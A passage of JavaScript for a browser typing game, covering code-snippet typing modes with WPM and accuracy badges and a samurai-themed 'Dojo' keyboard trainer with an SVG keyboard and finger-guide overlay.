            if (e.key.length === 1) {
                e.preventDefault();
                if (!codingState.startTime) codingState.startTime = Date.now();
                processChar(e.key, buffer, code);

                // Bracket auto-close highlight
                const autoCloseMap = { '(': ')', '{': '}', '[': ']' };
                if (autoCloseMap[e.key]) {
                    const nextIdx = codingState.charIndex;
                    if (nextIdx < code.length && code[nextIdx] === autoCloseMap[e.key]) {
                        const matchEl = buffer.querySelector(`.code-char[data-idx="${nextIdx}"]`);
                        if (matchEl) matchEl.classList.add('bracket-match');
                    }
                }

                if (codingState.charIndex >= code.length) {
                    input.removeEventListener('keydown', handler);
                    codingState._currentHandler = null;
                    codingState._currentInput = null;
                    if (onComplete) onComplete();
                }
            }
        };

        input.addEventListener('keydown', handler);
        codingState._currentHandler = handler;
        codingState._currentInput = input;
    }

    // Helper: backspace one character
    function backspaceOne(buffer, code) {
        codingState.charIndex--;
        const idx = codingState.charIndex;
        const charEl = buffer.querySelector(`.code-char[data-idx="${idx}"]`);
        buffer.querySelectorAll('.bracket-match').forEach(el => el.classList.remove('bracket-match'));
        if (charEl) {
            const wasWrong = charEl.classList.contains('wrong');
            charEl.classList.remove('typed', 'wrong', 'word-complete');
            if (codingState.total > 0) codingState.total--;
            if (!wasWrong && codingState.correct > 0) codingState.correct--;
        }
    }

    function processChar(typed, buffer, code) {
        const idx = codingState.charIndex;
        if (idx >= code.length) return;

        const expected = code[idx];
        const charEl = buffer.querySelector(`.code-char[data-idx="${idx}"]`);
        codingState.total++;

        // Remove old cursor
        buffer.querySelectorAll('.code-char.cursor').forEach(el => el.classList.remove('cursor'));
        // Remove old bracket matches
        buffer.querySelectorAll('.bracket-match').forEach(el => el.classList.remove('bracket-match'));

        if (typed === expected) {
            codingState.correct++;
            if (charEl) {
                charEl.classList.add('typed');
                charEl.classList.remove('wrong');
                // Check for word completion glow
                const tokenType = buffer._tokenTypes[idx];
                if (tokenType && (tokenType === 'kw-keyword' || tokenType === 'kw-function')) {
                    // Check if this is the last char of the token
                    const nextType = buffer._tokenTypes[idx + 1];
                    if (nextType !== tokenType) {
                        // Find start of this token and add glow pulse
                        let start = idx;
                        while (start > 0 && buffer._tokenTypes[start - 1] === tokenType) start--;
                        for (let j = start; j <= idx; j++) {
                            const el = buffer.querySelector(`.code-char[data-idx="${j}"]`);
                            if (el) { el.classList.add('word-complete'); }
                        }
                    }
                }
                // Bracket matching
                if ('{(['.includes(expected)) {
                    const matchIdx = buffer._bracketMap[idx];
                    if (matchIdx !== undefined) {
                        const matchEl = buffer.querySelector(`.code-char[data-idx="${matchIdx}"]`);
                        if (matchEl) matchEl.classList.add('bracket-match');
                    }
                }
            }
            codingState.charIndex++;
        } else {
            if (charEl) {
                charEl.classList.add('wrong');
            }
            codingState.charIndex++; // Move forward even on mistakes
        }

        // Set new cursor
        const nextEl = buffer.querySelector(`.code-char[data-idx="${codingState.charIndex}"]`);
        if (nextEl) {
            nextEl.classList.add('cursor');
            nextEl.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
        }
    }

    // ── SYNTAX_STORM GAME ──
    function launchStorm() {
        const snippets = codingSnippets[codingState.lang]?.[codingState.category] || [];
        if (!snippets.length) return;

        // Pick random snippets and join
        const shuffled = [...snippets].sort(() => Math.random() - 0.5);
        codingState.currentCode = shuffled.slice(0, 4).join('\n\n');
        codingState.timeLeft = 60;

        showCodingScreen('coding-storm-board');
        renderCodeBuffer(codingState.currentCode, 'storm-buffer', codingState.lang);

        // Reset HUD
        document.getElementById('storm-wpm').textContent = '0';
        document.getElementById('storm-accuracy').textContent = '100%';
        document.getElementById('storm-timer').textContent = '60';
        document.querySelector('.coding-hud-timer')?.classList.remove('danger');

        // Start timer
        if (codingState.timerInterval) clearInterval(codingState.timerInterval);
        if (codingState.wpmInterval) clearInterval(codingState.wpmInterval);

        codingState.timerInterval = setInterval(() => {
            if (!codingState.startTime) return; // Don't countdown until typing starts
            codingState.timeLeft--;
            document.getElementById('storm-timer').textContent = codingState.timeLeft;
            if (codingState.timeLeft <= 10) {
                document.querySelector('.coding-hud-timer')?.classList.add('danger');
            }
            if (codingState.timeLeft <= 0) {
                clearInterval(codingState.timerInterval);
                clearInterval(codingState.wpmInterval);
                showStormResults();
            }
        }, 1000);

        codingState.wpmInterval = setInterval(updateStormHUD, 300);

        initTypingEngine('storm-buffer', 'storm-input', () => {
            // Completed all text before time ran out — END THE GAME
            clearInterval(codingState.timerInterval);
            clearInterval(codingState.wpmInterval);
            showStormResults();
        });
    }

    function updateStormHUD() {
        if (!codingState.startTime) return;
        const mins = (Date.now() - codingState.startTime) / 60000;
        const wpm = Math.round((codingState.correct / 5) / mins) || 0;
        const acc = codingState.total > 0 ? Math.round((codingState.correct / codingState.total) * 100) : 100;
        document.getElementById('storm-wpm').textContent = wpm;
        document.getElementById('storm-accuracy').textContent = acc + '%';
    }

    function showStormResults() {
        const mins = codingState.startTime ? (Date.now() - codingState.startTime) / 60000 : 1;
        const wpm = Math.round((codingState.correct / 5) / mins) || 0;
        const acc = codingState.total > 0 ? Math.round((codingState.correct / codingState.total) * 100) : 100;

        let badge = 'D', title = 'SYNTAX ERROR';
        if (wpm >= 80 && acc >= 95) { badge = 'S+'; title = 'GOD-TIER CODER'; }
        else if (wpm >= 60 && acc >= 90) { badge = 'A+'; title = 'SENIOR ENGINEER'; }
        else if (wpm >= 45 && acc >= 85) { badge = 'A'; title = 'MID-LEVEL DEV'; }
        else if (wpm >= 30 && acc >= 80) { badge = 'B'; title = 'JUNIOR DEV'; }
        else if (wpm >= 20) { badge = 'C'; title = 'INTERN'; }

        document.getElementById('coding-results-badge').textContent = badge;
        document.getElementById('coding-results-title').textContent = title;
        document.getElementById('cr-wpm').textContent = wpm;
        document.getElementById('cr-accuracy').textContent = acc + '%';
        document.getElementById('cr-chars').textContent = codingState.correct;
        showCodingScreen('coding-results');

        // 🎵 Completion chime
        const stormQuality = acc === 100 ? 'perfect' : wpm >= 60 ? 'great' : 'good';
        playCompletionChime(stormQuality);
    }

    // ── ALGO_ZEN GAME ──
    function launchAlgo(idx) {
        const algo = algoData[idx];
        if (!algo) return;
        codingState.algoIndex = idx;
        codingState.currentCode = algo.code;
        codingState.bigoLevel = 10;

        showCodingScreen('coding-algo-board');
        renderCodeBuffer(algo.code, 'algo-buffer', 'python');

        // Reset HUD
        document.getElementById('algo-wpm').textContent = '0';
        document.getElementById('algo-accuracy').textContent = '100%';
        document.getElementById('algo-name').textContent = algo.name.toUpperCase();
        document.getElementById('bigo-fill').style.height = '10%';

        if (codingState.wpmInterval) clearInterval(codingState.wpmInterval);
        codingState.wpmInterval = setInterval(updateAlgoHUD, 300);

        initTypingEngine('algo-buffer', 'algo-input', () => {
            clearInterval(codingState.wpmInterval);
            showAlgoResults();
        });
    }

    function updateAlgoHUD() {
        if (!codingState.startTime) return;
        const mins = (Date.now() - codingState.startTime) / 60000;
        const wpm = Math.round((codingState.correct / 5) / mins) || 0;
        const acc = codingState.total > 0 ? Math.round((codingState.correct / codingState.total) * 100) : 100;
        document.getElementById('algo-wpm').textContent = wpm;
        document.getElementById('algo-accuracy').textContent = acc + '%';

        // Big O bar: maps WPM×accuracy to 0-100%
        const score = (wpm / 80) * (acc / 100);
        const targetPct = Math.min(100, Math.max(5, score * 100));
        const fill = document.getElementById('bigo-fill');

        // Smooth or glitch
        if (targetPct < codingState.bigoLevel - 5) {
            // Drop — glitch effect
            fill.parentElement.classList.add('bigo-glitch');
            setTimeout(() => fill.parentElement.classList.remove('bigo-glitch'), 300);
        }
        codingState.bigoLevel = targetPct;
        fill.style.height = targetPct + '%';
    }

    function showAlgoResults() {
        const mins = codingState.startTime ? (Date.now() - codingState.startTime) / 60000 : 1;
        const wpm = Math.round((codingState.correct / 5) / mins) || 0;
        const acc = codingState.total > 0 ? Math.round((codingState.correct / codingState.total) * 100) : 100;

        let badge = 'D', title = 'RUNTIME ERROR';
        if (wpm >= 60 && acc >= 95) { badge = 'O(1)'; title = 'CONSTANT TIME MASTERY'; }
        else if (wpm >= 45 && acc >= 90) { badge = 'O(log n)'; title = 'LOGARITHMIC FLOW'; }
        else if (wpm >= 30 && acc >= 85) { badge = 'O(n)'; title = 'LINEAR EXECUTION'; }
        else if (wpm >= 20 && acc >= 75) { badge = 'O(n²)'; title = 'QUADRATIC GRIND'; }

        document.getElementById('coding-results-badge').textContent = badge;
        document.getElementById('coding-results-title').textContent = title;
        document.getElementById('cr-wpm').textContent = wpm;
        document.getElementById('cr-accuracy').textContent = acc + '%';
        document.getElementById('cr-chars').textContent = codingState.correct;
        showCodingScreen('coding-results');

        // 🎵 Completion chime
        const algoQuality = acc === 100 ? 'perfect' : (badge === 'O(1)' || badge === 'O(log n)') ? 'great' : 'good';
        playCompletionChime(algoQuality);
    }

    // ── DSA_MASTER GAME ──
    function launchDsa(idx) {
        const dsa = dsaData[idx];
        if (!dsa) return;
        codingState.dsaIndex = idx;
        codingState.currentCode = dsa.code;

        showCodingScreen('coding-dsa-board');

        // Left panel
        document.getElementById('dsa-title').textContent = dsa.name;
        const diffEl = document.getElementById('dsa-difficulty');
        diffEl.textContent = dsa.difficulty;
        diffEl.className = 'dsa-difficulty ' + dsa.difficulty.toLowerCase();

        // Render topic chips
        const topicsEl = document.getElementById('dsa-topics');
        topicsEl.innerHTML = '';
        const topics = dsa.topics || [dsa.category];
        topics.forEach(topic => {
            const chip = document.createElement('span');
            chip.className = 'dsa-topic-chip';
            chip.textContent = topic;
            topicsEl.appendChild(chip);
        });

        document.getElementById('dsa-description').innerHTML = dsa.description;

        // Right panel
        renderCodeBuffer(dsa.code, 'dsa-buffer', 'python');

        // Reset HUD
        document.getElementById('dsa-wpm').textContent = '0';
        document.getElementById('dsa-accuracy').textContent = '100%';

        if (codingState.wpmInterval) clearInterval(codingState.wpmInterval);
        codingState.wpmInterval = setInterval(updateDsaHUD, 300);

        initTypingEngine('dsa-buffer', 'dsa-input', () => {
            clearInterval(codingState.wpmInterval);
            showDsaResults();
        });
    }

    function updateDsaHUD() {
        if (!codingState.startTime) return;
        const mins = (Date.now() - codingState.startTime) / 60000;
        const wpm = Math.round((codingState.correct / 5) / mins) || 0;
        const acc = codingState.total > 0 ? Math.round((codingState.correct / codingState.total) * 100) : 100;
        document.getElementById('dsa-wpm').textContent = wpm;
        document.getElementById('dsa-accuracy').textContent = acc + '%';
    }

    function showDsaResults() {
        const mins = codingState.startTime ? (Date.now() - codingState.startTime) / 60000 : 1;
        const wpm = Math.round((codingState.correct / 5) / mins) || 0;
        const acc = codingState.total > 0 ? Math.round((codingState.correct / codingState.total) * 100) : 100;

        let badge = 'C', title = 'REJECTED';
        if (wpm >= 80 && acc >= 98) { badge = 'S+'; title = 'L6 STAFF ENGINEER'; }
        else if (wpm >= 60 && acc >= 95) { badge = 'A+'; title = 'SENIOR SWE (FAANG)'; }
        else if (wpm >= 45 && acc >= 90) { badge = 'A'; title = 'HIRED'; }
        else if (wpm >= 30 && acc >= 85) { badge = 'B'; title = 'ABOVE AVERAGE'; }
        else if (wpm >= 20 && acc >= 75) { badge = 'C'; title = 'NEEDS IMPROVEMENT'; }

        document.getElementById('coding-results-badge').textContent = badge;
        document.getElementById('coding-results-title').textContent = title;
        document.getElementById('cr-wpm').textContent = wpm;
        document.getElementById('cr-accuracy').textContent = acc + '%';
        document.getElementById('cr-chars').textContent = codingState.correct;
        showCodingScreen('coding-results');

        // 🎵 Completion chime
        const dsaQuality = acc === 100 ? 'perfect' : badge === 'S+' || badge === 'A+' ? 'great' : 'good';
        playCompletionChime(dsaQuality);
    }

    // ── DOJO MODE (unchanged below) ──

    let dojoState = {
        active: false,
        target: null,
        streak: 0,
        maxStreak: 0,
        total: 0,
        correct: 0,
        listener: null,
        handGuideOn: false
    };

    function startDojoMode() {
        const splash = document.getElementById('dojo-splash');
        if (!splash) return;

        splash.classList.remove('hidden');

        setTimeout(() => {
            splash.classList.add('hidden');

            // Hide main UI
            const gameUI = document.getElementById('game-ui');
            const appHeader = document.getElementById('app-header');
            const navButtons = document.getElementById('top-nav-buttons');
            const footer = document.querySelector('footer') || document.querySelector('.site-footer');

            if (gameUI) gameUI.classList.add('hidden');
            if (appHeader) appHeader.style.display = 'none';
            if (navButtons) navButtons.style.display = 'none';
            if (footer) footer.style.display = 'none';

            // Show Dojo UI with setup screen
            const dojoUI = document.getElementById('dojo-ui');
            if (dojoUI) dojoUI.classList.remove('hidden');

            state.gameMode = 'dojo';

            initDojoSetup();

        }, 2500);
    }

    const dojoLevelInfo = {
        1: {
            title: "KATANA POSITION",
            desc: "The foundation of all swordplay begins with the grip. In typing, this is the Home Row position for your index fingers (F & J). Mastering this anchors your hands, allowing you to strike any key without looking.",
            benefits: [
                "Establishes core muscle memory",
                "Eliminates the need to look at the keyboard",
                "foundation for all future speed"
            ]
        },
        2: {
            title: "FIRST STRIKES",
            desc: "The Home Row (A-S-D-F-G-H-J-K-L) is your center of gravity. These keys are the most accessible and frequently used. Mastery here means you never lose your balance.",
            benefits: [
                "Covers 70% of common typing strokes",
                "Maximum speed with minimal movement",
                "Reduces finger fatigue significantly"
            ]
        },
        3: {
            title: "RISING BLADE",
            desc: "The Top Row contains many of the most dominant letters (E, R, T, O, I). Reaching up without lifting your palms is the mark of a disciplined warrior.",
            benefits: [
                "Access to high-frequency vowels (E, I, O)",
                "Develops vertical finger independence",
                "Essential for fluid sentence structure"
            ]
        },
        4: {
            title: "GROUNDING STANCE",
            desc: "The Bottom Row is often the most neglected. Striking downwards requires a shift in weight and intent. Mastery ensures no weakness in your defense.",
            benefits: [
                "Conquers the hardest-to-reach keys",
                "Prevents rhythm breaks on common letters (N, M, C)",
                "Completes full keyboard control"
            ]
        },
        5: {
            title: "FLOWING WATER",
            desc: "Now you must blend all stances. There are no rows anymore, only the flow of characters. Your fingers should move like water, adapting to any letter instantly.",
            benefits: [
                "Seamless transitions between rows",
                "Unified mental map of the keyboard",
                "Preparation for real-world typing"
            ]
        },
        6: {
            title: "WORDS OF POWER",
            desc: "Individual strikes mean nothing if they do not form meaning. Here you channel your technique into actual words, learning the rhythm of language itself.",
            benefits: [
                "Transition from letters to patterns",
                "Recognize common word shapes",
                "Increases Words Per Minute (WPM) drastically"
            ]
        },
        7: {
            title: "WAY OF THE WIND",
            desc: "Attributes: Speed, Reflexes, Instinct. You have the technique; now you need the speed. This level pushes you to your absolute limit. Hesitation is defeat.",
            benefits: [
                "Raw reaction time training",
                "Stress-testing your muscle memory",
                "The path to becoming a Grandmaster"
            ]
        }
    };

    function initDojoSetup() {
        // Show setup, hide game board
        const setup = document.getElementById('dojo-setup');
        const board = document.getElementById('dojo-game-board');
        if (setup) setup.style.display = '';
        if (board) board.classList.add('hidden');

        // Exit btn — leaves dojo entirely
        const exitBtn = document.getElementById('dojo-exit-btn');
        if (exitBtn) exitBtn.onclick = exitDojoMode;

        // Back btn — returns from game to level select
        const backBtn = document.getElementById('dojo-back-btn');
        if (backBtn) backBtn.onclick = backToDojoSetup;

        const guideBtn = document.getElementById('dojo-guide-btn');
        if (guideBtn) guideBtn.onclick = toggleHandGuide;

        // Info Modal Elements
        const infoModal = document.getElementById('dojo-level-info-modal');
        const closeInfoBtn = document.getElementById('close-dojo-info');
        const infoOverlay = document.querySelector('.dojo-info-overlay');

        if (closeInfoBtn) closeInfoBtn.onclick = () => infoModal.classList.add('hidden');
        if (infoOverlay) infoOverlay.onclick = () => infoModal.classList.add('hidden');

        // Info Triggers
        document.querySelectorAll('.dojo-info-trigger').forEach(btn => {
            btn.onclick = (e) => {
                e.stopPropagation(); // Prevent level launch
                const level = btn.dataset.level;
                const data = dojoLevelInfo[level];

                if (data && infoModal) {
                    document.getElementById('d-info-title').textContent = data.title;
                    document.getElementById('d-info-desc').textContent = data.desc;
                    const list = document.getElementById('d-info-list');
                    list.innerHTML = data.benefits.map(b => `<li>${b}</li>`).join('');
                    infoModal.classList.remove('hidden');
                }
            };
        });

        // Level card click handlers
        const cards = document.querySelectorAll('.dojo-level-card');
        cards.forEach(card => {
            card.onclick = () => {
                if (card.classList.contains('locked')) return;
                const level = parseInt(card.dataset.level);
                launchDojoLevel(level);
            };
        });
    }

    function launchDojoLevel(level) {
        // Hide setup, show game board
        const setup = document.getElementById('dojo-setup');
        const board = document.getElementById('dojo-game-board');
        if (setup) setup.style.display = 'none';
        if (board) board.classList.remove('hidden');

        // Level config
        const levelConfig = {
            1: { name: 'KATANA POSITION', keys: ['f', 'j'], mode: 'key' },
            2: { name: 'FIRST STRIKES', keys: 'asdfghjkl'.split(''), mode: 'key' },
            3: { name: 'RISING BLADE', keys: 'qwertyuiop'.split(''), mode: 'key' },
            4: { name: 'GROUNDING STANCE', keys: 'zxcvbnm'.split(''), mode: 'key' },
            5: { name: 'FLOWING WATER', keys: 'abcdefghijklmnopqrstuvwxyz'.split(''), mode: 'key' },
            6: {
                name: 'WORDS OF POWER', mode: 'word', words: [
                    'blade', 'steel', 'flame', 'storm', 'blood', 'honor', 'death', 'swift',
                    'strike', 'power', 'focus', 'spirit', 'shadow', 'light', 'brave',
                    'wrath', 'forge', 'might', 'clash', 'guard', 'slash', 'force',
                    'wind', 'fury', 'oath', 'doom', 'edge', 'iron', 'soul', 'dark',
                    'shield', 'valor', 'reign', 'dread', 'stone', 'blaze', 'frost'
                ]
            },
            7: {
                name: 'WAY OF THE WIND', mode: 'word', words: [
                    'warrior', 'katana', 'samurai', 'destiny', 'victory', 'silence',
                    'thunder', 'resolve', 'courage', 'balance', 'mastery', 'tornado',
                    'phantom', 'eclipse', 'ancient', 'diamond', 'harmony', 'inferno',
                    'justice', 'kingdom', 'legends', 'tempest', 'unleash', 'volatile',
                    'whisper', 'zealous', 'ascend', 'conquer', 'defend', 'empower',
                    'immortal', 'invincible', 'relentless', 'unstoppable', 'discipline',
                    'perseverance', 'enlightenment', 'transcendence'
                ]
            }
        };

        const config = levelConfig[level] || levelConfig[1];
        dojoState.currentLevel = level;
        dojoState.keyPool = config.keys || [];
        dojoState.wordMode = config.mode === 'word';
        dojoState.timedMode = (level === 7);
        dojoState.wordPool = config.words || [];
        dojoState.currentWord = null;
        dojoState.wordCharIndex = 0;
        dojoState.timerInterval = null;

        // Toggle key prompt vs word display
        const promptArea = document.querySelector('#dojo-game-board .dojo-prompt-area');
        const wordDisplay = document.getElementById('dojo-word-display');
        const timerBar = document.getElementById('dojo-timer-bar');
        if (dojoState.wordMode) {
            if (promptArea) promptArea.style.display = 'none';
            if (wordDisplay) wordDisplay.classList.remove('hidden');
            if (timerBar) timerBar.classList.toggle('hidden', !dojoState.timedMode);
        } else {
            if (promptArea) promptArea.style.display = '';
            if (wordDisplay) wordDisplay.classList.add('hidden');
            if (timerBar) timerBar.classList.add('hidden');
        }

        // Update header
        const titleEl = document.getElementById('dojo-board-title');
        const levelEl = document.getElementById('dojo-board-level');
        if (titleEl) titleEl.textContent = 'THE DOJO';
        if (levelEl) levelEl.textContent = `LEVEL ${level} \u2014 ${config.name}`;

        // Show/hide global timer for Level 7
        const globalTimer = document.getElementById('dojo-global-timer');
        const globalTimerValue = document.getElementById('dojo-global-timer-value');
        if (dojoState.timedMode) {
            if (globalTimer) globalTimer.classList.remove('hidden');
            if (globalTimerValue) {
                globalTimerValue.textContent = '00:15';
                globalTimerValue.classList.remove('danger');
            }
            dojoState.globalTimeLeft = 15; // 15 seconds (Final)
            dojoState.globalTimerInterval = null;
        } else {
            if (globalTimer) globalTimer.classList.add('hidden');
            if (dojoState.globalTimerInterval) {
                clearInterval(dojoState.globalTimerInterval);
                dojoState.globalTimerInterval = null;
            }
        }

        renderDojoKeyboard();
        initDojoLevel1();
    }

    function backToDojoSetup() {
        // Cleanup listener
        if (dojoState.listener) {
            document.removeEventListener('keydown', dojoState.listener);
            dojoState.listener = null;
        }
        if (dojoState.timerInterval) {
            clearInterval(dojoState.timerInterval);
            dojoState.timerInterval = null;
        }
        if (dojoState.globalTimerInterval) {
            clearInterval(dojoState.globalTimerInterval);
            dojoState.globalTimerInterval = null;
        }
        dojoState.active = false;

        initDojoSetup();
    }


    function exitDojoMode() {
        // Cleanup listener
        if (dojoState.listener) {
            document.removeEventListener('keydown', dojoState.listener);
            dojoState.listener = null;
        }
        if (dojoState.timerInterval) {
            clearInterval(dojoState.timerInterval);
            dojoState.timerInterval = null;
        }
        if (dojoState.globalTimerInterval) {
            clearInterval(dojoState.globalTimerInterval);
            dojoState.globalTimerInterval = null;
        }
        dojoState.active = false;

        // Hide Dojo UI
        const dojoUI = document.getElementById('dojo-ui');
        if (dojoUI) dojoUI.classList.add('hidden');

        // Restore main UI
        const gameUI = document.getElementById('game-ui');
        const appHeader = document.getElementById('app-header');
        const navButtons = document.getElementById('top-nav-buttons');
        const footer = document.querySelector('footer') || document.querySelector('.site-footer');

        if (gameUI) gameUI.classList.remove('hidden');
        if (appHeader) appHeader.style.display = '';
        if (navButtons) navButtons.style.display = '';
        if (footer) footer.style.display = '';

        state.gameMode = 'time';
        newGame();
    }

    function renderDojoKeyboard() {
        const container = document.getElementById('dojo-keyboard-container');
        if (!container) return;

        const keyW = 60, keyH = 60, gap = 5;
        const rows = [
            { keys: 'QWERTYUIOP'.split(''), offsetX: 20 },
            { keys: 'ASDFGHJKL'.split(''), offsetX: 40 },
            { keys: 'ZXCVBNM'.split(''), offsetX: 72 }
        ];

        const svgW = 10 * (keyW + gap) + 80;
        const svgH = 3 * (keyH + gap) + 30;

        let svg = `<svg id="dojo-keyboard" viewBox="0 0 ${svgW} ${svgH}" xmlns="http://www.w3.org/2000/svg">`;

        rows.forEach((row, ri) => {
            const y = 15 + ri * (keyH + gap);
            row.keys.forEach((key, ki) => {
                const x = row.offsetX + ki * (keyW + gap);
                const isBalance = (key === 'F' || key === 'J');
                const groupClass = isBalance ? 'balance-point' : '';

                svg += `<g class="dojo-key ${groupClass}" data-key="${key.toLowerCase()}">`;
                svg += `<rect class="key-bg" x="${x}" y="${y}" width="${keyW}" height="${keyH}" rx="6" ry="6"/>`;
                svg += `<text class="key-label" x="${x + keyW / 2}" y="${y + keyH / 2}">${key}</text>`;

                // Balance point bump indicator
                if (isBalance) {
                    svg += `<line class="balance-marker" x1="${x + keyW / 2 - 6}" y1="${y + keyH - 8}" x2="${x + keyW / 2 + 6}" y2="${y + keyH - 8}"/>`;

                    // Blood drips from F and J keys
                    const drips = [
                        { dx: keyW * 0.25, delay: 0 },
                        { dx: keyW * 0.55, delay: 1.2 },
                        { dx: keyW * 0.75, delay: 2.4 }
                    ];
                    drips.forEach((drip, di) => {
                        const dripX = x + drip.dx;
                        const dripStartY = y + keyH;
                        svg += `<g class="blood-drip" style="animation-delay: ${drip.delay}s">`;
                        svg += `<ellipse cx="${dripX}" cy="${dripStartY + 6}" rx="2.5" ry="3.5" class="blood-drop"/>`;
                        svg += `<rect x="${dripX - 1}" y="${dripStartY}" width="2" height="6" class="blood-trail" rx="1"/>`;
                        svg += `</g>`;
                    });
                }

                svg += `</g>`;
            });
        });

        svg += `</svg>`;
        container.innerHTML = svg;

        // Add hand guide overlay
        createHandGuideOverlay(container);
    }

    function createHandGuideOverlay(container) {
        const old = document.getElementById('hand-guide-overlay');
        if (old) old.remove();

        // Keyboard: keyW=60, keyH=60, gap=5
        // Home row: y=80..140, key centers: A=70, S=135, D=200, F=265 | J=460, K=525, L=590
        const palmY = 150; // Where fingers meet the palm

        // ── Finger SVG generator ──
        // Creates a natural tapered finger with knuckle detail + fingernail arc
        function finger(cx, tipY, baseW, tipW, name) {
            const bh = baseW / 2;
            const th = tipW / 2;
            const len = palmY - tipY;
            const k1Y = tipY + len * 0.35;
            const k2Y = tipY + len * 0.65;
            const midW = (bh + th) / 2;

            let d = `M ${cx - bh} ${palmY}`;
            d += ` C ${cx - bh} ${k2Y + 5}, ${cx - midW - 0.5} ${k1Y + 8}, ${cx - th} ${tipY + th}`;
            d += ` Q ${cx - th} ${tipY - 1}, ${cx} ${tipY - 2}`;
            d += ` Q ${cx + th} ${tipY - 1}, ${cx + th} ${tipY + th}`;
            d += ` C ${cx + midW + 0.5} ${k1Y + 8}, ${cx + bh} ${k2Y + 5}, ${cx + bh} ${palmY}`;

            let g = `<g class="guide-finger-position" data-finger="${name}">`;
            g += `<g class="guide-finger-squish">`; // Inner group for squish animation
            g += `<path d="${d}" class="guide-finger"/>`;

            const nailW = th * 0.75;
            const nailY = tipY + 3;
            g += `<path d="M ${cx - nailW} ${nailY + 4} Q ${cx - nailW} ${nailY}, ${cx} ${nailY - 1} Q ${cx + nailW} ${nailY}, ${cx + nailW} ${nailY + 4}" class="guide-nail"/>`;

            const crW1 = midW * 0.7;
            const crW2 = (midW + bh) / 2 * 0.6;
            g += `<line x1="${cx - crW1}" y1="${k1Y}" x2="${cx + crW1}" y2="${k1Y}" class="guide-crease"/>`;
            g += `<line x1="${cx - crW2}" y1="${k2Y}" x2="${cx + crW2}" y2="${k2Y}" class="guide-crease"/>`;

            // Marker for ripple effect origin
            g += `<circle cx="${cx}" cy="${tipY}" r="0" class="guide-tip-marker" style="display:none;"/>`;

            g += `</g>`; // End squish group
            g += `</g>`; // End position group
            return g;
        }

        let svg = `<svg viewBox="0 0 730 310" preserveAspectRatio="xMidYMid meet" class="hand-guide-svg" xmlns="http://www.w3.org/2000/svg">`;

        // ═══════ LEFT HAND ═══════
        svg += `<g class="guide-hand guide-hand-left">`;
        //              center  tipY  baseW  tipW   name
        svg += finger(70, 102, 13, 10, 'l-pinky');
        svg += finger(135, 90, 15, 12, 'l-ring');
        svg += finger(200, 83, 16, 13, 'l-mid');
        svg += finger(265, 89, 16, 13, 'l-index');

        // Skin webs between fingers (natural V-curves)
        // svg += `<path d="M 77 ${palmY} Q 102 ${palmY - 14}, 127 ${palmY}" class="guide-web"/>`;
        // svg += `<path d="M 143 ${palmY} Q 168 ${palmY - 18}, 192 ${palmY}" class="guide-web"/>`;
        // svg += `<path d="M 208 ${palmY} Q 233 ${palmY - 15}, 257 ${palmY}" class="guide-web"/>`;

        // Left palm — slim, stays within finger span
        // svg += `<path d="
        //     M 63 ${palmY}
        //     C 63 ${palmY + 15}, 65 ${palmY + 35}, 72 ${palmY + 52}
        //     C 80 ${palmY + 70}, 100 ${palmY + 78}, 140 ${palmY + 80}
        //     L 200 ${palmY + 78}
        //     C 240 ${palmY + 75}, 260 ${palmY + 68}, 268 ${palmY + 50}
        //     C 273 ${palmY + 35}, 273 ${palmY + 15}, 273 ${palmY}
        // " class="guide-palm"/>`;

        // Palm crease lines
        // svg += `<path d="M 72 ${palmY + 20} Q 120 ${palmY + 35}, 168 ${palmY + 32} Q 220 ${palmY + 28}, 260 ${palmY + 15}" class="guide-crease" fill="none"/>`;
        // svg += `<path d="M 78 ${palmY + 42} Q 130 ${palmY + 54}, 175 ${palmY + 52} Q 230 ${palmY + 48}, 262 ${palmY + 38}" class="guide-crease" fill="none"/>`;

        // Wrist — tapers in slightly
        // svg += `<path d="
        //     M 80 ${palmY + 76} L 92 ${palmY + 110}
        // " class="guide-wrist"/>`;
        // svg += `<path d="
        //     M 258 ${palmY + 72} L 248 ${palmY + 110}
        // " class="guide-wrist"/>`;

        svg += `</g>`;

        // ═══════ RIGHT HAND ═══════
        svg += `<g class="guide-hand guide-hand-right">`;

        svg += finger(460, 89, 16, 13, 'r-index');
        svg += finger(525, 83, 16, 13, 'r-mid');
        svg += finger(590, 90, 15, 12, 'r-ring');
        svg += finger(648, 102, 13, 10, 'r-pinky');

        // Skin webs between fingers
        // svg += `<path d="M 468 ${palmY} Q 493 ${palmY - 15}, 517 ${palmY}" class="guide-web"/>`;
        // svg += `<path d="M 533 ${palmY} Q 558 ${palmY - 18}, 582 ${palmY}" class="guide-web"/>`;
        // svg += `<path d="M 598 ${palmY} Q 620 ${palmY - 14}, 641 ${palmY}" class="guide-web"/>`;


        // Right palm — slim, mirrored
        // svg += `<path d="
        //     M 453 ${palmY}
        //     C 453 ${palmY + 15}, 451 ${palmY + 35}, 456 ${palmY + 50}
        //     C 464 ${palmY + 68}, 484 ${palmY + 75}, 524 ${palmY + 78}
        //     L 580 ${palmY + 80}
        //     C 620 ${palmY + 78}, 644 ${palmY + 70}, 652 ${palmY + 52}
        //     C 659 ${palmY + 35}, 661 ${palmY + 15}, 661 ${palmY}
        // " class="guide-palm"/>`;

        // Palm crease lines
        // svg += `<path d="M 464 ${palmY + 15} Q 510 ${palmY + 28}, 556 ${palmY + 32} Q 610 ${palmY + 35}, 652 ${palmY + 20}" class="guide-crease" fill="none"/>`;
        // svg += `<path d="M 462 ${palmY + 38} Q 504 ${palmY + 48}, 549 ${palmY + 52} Q 604 ${palmY + 54}, 646 ${palmY + 42}" class="guide-crease" fill="none"/>`;

        // Wrist — tapers in slightly
        // svg += `<path d="
        //     M 466 ${palmY + 72} L 476 ${palmY + 110}
        // " class="guide-wrist"/>`;
        // svg += `<path d="
        //     M 644 ${palmY + 76} L 632 ${palmY + 110}
        // " class="guide-wrist"/>`;

        svg += `</g>`;
        svg += `</svg>`;

        const overlay = document.createElement('div');
        overlay.id = 'hand-guide-overlay';
        overlay.innerHTML = svg;
        overlay.style.display = dojoState.handGuideOn ? '' : 'none'; // Hidden by default
        container.appendChild(overlay);
    }

    // ── Key-to-finger mapping ──
    const keyFingerMap = {
        'q': 'l-pinky', 'a': 'l-pinky', 'z': 'l-pinky',
        'w': 'l-ring', 's': 'l-ring', 'x': 'l-ring',
        'e': 'l-mid', 'd': 'l-mid', 'c': 'l-mid',
        'r': 'l-index', 'f': 'l-index', 'v': 'l-index',
        't': 'l-index', 'g': 'l-index', 'b': 'l-index',
        'y': 'r-index', 'h': 'r-index', 'n': 'r-index',
        'u': 'r-index', 'j': 'r-index', 'm': 'r-index',
        'i': 'r-mid', 'k': 'r-mid',
